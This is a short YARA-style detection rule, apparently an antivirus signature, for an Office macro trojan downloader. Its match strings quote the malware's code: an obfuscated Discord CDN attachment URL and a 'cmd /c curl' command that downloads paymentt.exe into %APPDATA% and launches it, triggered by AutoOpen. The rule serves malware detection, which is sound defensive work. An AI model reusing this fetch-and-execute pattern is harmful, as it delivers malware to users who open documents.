
rule TrojanDownloader_O97M_EncDoc_SC_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.SC!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {3d 20 22 68 74 74 22 20 26 20 51 28 29 20 26 20 22 63 64 6e 2e 64 22 20 26 20 47 28 29 20 26 20 22 64 61 70 70 2e 63 22 20 26 20 44 44 28 29 20 26 20 22 61 63 68 6d 65 6e 74 73 2f 22 } //1 = "htt" & Q() & "cdn.d" & G() & "dapp.c" & DD() & "achments/"
		$a_01_1 = {53 68 65 6c 6c 20 28 22 63 6d 64 20 2f 63 20 63 75 72 6c 20 22 20 26 20 4f 20 26 20 53 53 28 29 20 26 20 22 2f 22 20 26 20 57 57 28 29 20 26 20 22 2f 70 61 79 6d 65 6e 74 74 2e 65 78 65 22 20 26 20 22 20 2d 2d 6f 75 74 70 75 74 20 25 41 50 50 44 41 54 41 25 5c 70 61 79 6d 65 6e 74 74 2e 65 78 65 20 20 26 26 20 74 69 6d 65 6f 75 74 20 31 20 26 26 20 73 74 61 72 74 20 25 41 50 50 44 41 54 41 25 5c 70 61 79 6d 65 6e 74 74 2e 65 78 65 22 29 } //1 Shell ("cmd /c curl " & O & SS() & "/" & WW() & "/paymentt.exe" & " --output %APPDATA%\paymentt.exe  && timeout 1 && start %APPDATA%\paymentt.exe")
		$a_01_2 = {41 75 74 6f 4f 70 65 6e 20 4d 61 63 72 6f } //1 AutoOpen Macro
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}